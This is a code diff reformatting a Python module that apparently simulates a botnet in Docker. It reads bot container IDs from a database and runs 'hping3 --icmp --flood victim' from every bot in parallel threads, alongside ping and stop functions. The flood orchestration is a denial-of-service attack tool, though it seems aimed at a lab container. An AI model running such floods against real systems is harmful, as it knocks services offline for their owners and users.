@@ -1,16 +1,18 @@
-import docker, threading, sqlite3 
+import docker, threading, sqlite3
+from .settings import client
 
-client = docker.from_env()
 
 def ping(container_id):
-  container = client.containers.get(container_id)
-  result = container.exec_run('ping -c 4 victim')
-  print(result.output.decode())
+    container = client.containers.get(container_id)
+    result = container.exec_run("ping -c 4 victim")
+    print(result.output.decode())
+
 
 def icmp_flood(container_id):
-  container = client.containers.get(container_id)
-  result = container.exec_run('hping3 --icmp --flood victim')
-  print(result.output.decode())
+    container = client.containers.get(container_id)
+    result = container.exec_run("hping3 --icmp --flood victim")
+    print(result.output.decode())
+
 
 def execute_attack(attack):
     conn = sqlite3.connect("database.db")
@@ -18,7 +20,10 @@ def execute_attack(attack):
     cursor.execute("SELECT container_id FROM bots")
     result = cursor.fetchall()
     container_ids = [x[0] for x in result]
-    threads = [threading.Thread(target=attack, args=(container_id,)) for container_id in container_ids]
+    threads = [
+        threading.Thread(target=attack, args=(container_id,))
+        for container_id in container_ids
+    ]
 
     # Spuštění všech vláken
     for thread in threads:
@@ -28,9 +33,10 @@ def execute_attack(attack):
         thread.join()
 
     conn.close()
-    return 'Attack finished'
+    return "Attack finished"
+
 
 def stop_attack(container_id):
-  container = client.containers.get(container_id)
-  result = container.exec_run('pkill hping3')
-  print(result.output.decode())
+    container = client.containers.get(container_id)
+    result = container.exec_run("pkill hping3")
+    print(result.output.decode())
